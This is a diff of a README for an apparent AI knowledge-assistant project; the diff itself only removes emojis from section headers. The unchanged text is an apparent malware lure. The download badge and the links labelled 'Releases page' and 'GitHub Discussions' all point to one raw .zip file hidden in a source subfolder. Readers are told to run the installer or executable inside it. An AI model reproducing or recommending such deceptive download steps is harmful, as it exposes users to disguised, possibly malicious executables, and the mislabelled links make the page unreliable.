@@ -2,11 +2,11 @@
 
 [![Download RAG-Based-Knowledge-Assistant](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip)](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip)
 
-## 🚀 Getting Started
+## Getting Started
 
 Welcome to the RAG-Based-Knowledge-Assistant! This application helps streamline how you find and interact with information using advanced AI techniques. Whether you are looking for documents or chatting about a topic, this tool is built to make it easy.
 
-## 📥 Download & Install
+## Download & Install
 
 To get started, you need to download the application. 
 
@@ -20,7 +20,7 @@ To get started, you need to download the application.
 
 5. **Run the installer or executable.** After downloading, find the file in the location where it was saved and double-click on it to start the installation. Follow the prompts until the setup finishes.
 
-## 🔍 Features
+## Features
 
 - **Modular Design:** Easily customize the pipeline for your unique needs.
 - **Ingestion and Chunking:** Efficiently handle and split documents into manageable parts.
@@ -28,7 +28,7 @@ To get started, you need to download the application.
 - **Multi-Turn Chat:** Engage in extended conversations to get more context about your inquiries.
 - **Built with FastAPI and SQLAlchemy:** Provides a reliable and fast interface for users.
 
-## 📋 System Requirements
+## System Requirements
 
 To run the RAG-Based-Knowledge-Assistant, your computer needs to meet these basic requirements:
 
@@ -37,7 +37,7 @@ To run the RAG-Based-Knowledge-Assistant, your computer needs to meet these basi
 - **Disk Space:** Minimum 500 MB of free disk space for installation.
 - **Python:** Ensure that Python 3.7 or later is installed on your machine.
 
-## 🔧 Setup Instructions
+## Setup Instructions
 
 Once you have installed the application, follow these steps to get it running:
 
@@ -49,7 +49,7 @@ Once you have installed the application, follow these steps to get it running:
 
 4. **Start Using the Assistant:** Begin asking questions or searching for documents using the chat interface. The assistant will analyze your requests and provide relevant information.
 
-## ⚙️ Using the Application
+## Using the Application
 
 To use the RAG-Based-Knowledge-Assistant effectively:
 
@@ -57,7 +57,7 @@ To use the RAG-Based-Knowledge-Assistant effectively:
 - **Utilize Chunking:** If you are working with large documents, make sure to break them down into smaller chunks for better results.
 - **Explore Settings:** Check the settings to customize how the assistant interacts with you. Adjust options for notifications or data sources as preferred.
 
-## 🙋 Frequently Asked Questions
+## Frequently Asked Questions
 
 ### How do I troubleshoot installation issues?
 
@@ -71,7 +71,7 @@ Yes, the RAG-Based-Knowledge-Assistant supports offline mode. However, some feat
 
 To update, go back to the [Releases page](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip) and download the latest version like you did during the initial setup.
 
-## 🌐 Community and Support
+## Community and Support
 
 If you have questions or need assistance, join our community on [GitHub Discussions](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip). Engage with other users, share your experiences, and get advice.
 
